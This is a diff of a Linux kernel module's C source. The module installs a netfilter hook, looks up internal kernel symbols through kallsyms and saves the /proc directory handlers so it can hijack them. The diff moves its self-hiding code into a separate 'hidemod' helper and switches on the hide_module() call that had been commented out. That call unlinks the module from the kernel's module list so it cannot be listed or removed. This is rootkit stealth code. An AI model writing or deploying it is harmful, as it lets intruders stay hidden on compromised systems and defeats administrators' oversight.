@@ -8,14 +8,13 @@
 #include <linux/kallsyms.h>
 #include "util.h"
 #include "module.h"
+#include "hidemod.h"
 
 
 /* This is the structure we shall use to register our function */
 static struct nf_hook_ops nfho;
-struct module *me;
 
 spinlock_t	 *_proc_dir_spinlock;
-struct mutex     *_module_mutex;
 
 /* Backup of the previous handlers */ 
 struct file_operations proc_original_file_operations;
@@ -34,7 +33,7 @@ extern unsigned int hook_func (
 void init_symbols(void)
 {
 	_proc_dir_spinlock = (spinlock_t *) my_sym_lookup("proc_subdir_lock");
-	_module_mutex = (struct mutex *) my_sym_lookup("module_mutex");
+	hidemod_setmutex( my_sym_lookup("module_mutex") );
 }
 
 /* Initialisation routine */
@@ -50,16 +49,15 @@ int init_module ()
 
 	nf_register_hook (&nfho);
 
-	// Safe pointer to us!
-	me = &__this_module;
-
 	init_symbols();
 
-	printk("Address of module_mutex: %p\n", _module_mutex);
+	// Safe pointer to us!
+	hidemod_setmodule(&__this_module);
+	// Hide the module.
+	hide_module();
+
 	printk("Address of proc_dir_spinlock: %p\n", _proc_dir_spinlock);
 
-	// Hide the module.
-	//hide_module();
 	
 	// Backup previous handlers.
 	proc_original_file_operations.readdir = proc_root.proc_fops->readdir;
@@ -91,16 +89,6 @@ void cleanup_module ()
 
 	spin_unlock(&_proc_dir_spinlock);
 
-}
-
-// Removes this module from the kernel modules list. rmmod would stop working for this module.
-void hide_module()
-{
-	mutex_lock(_module_mutex);
-
-	list_del(&(me->list));
-
-	mutex_unlock(_module_mutex);
 }
 
 
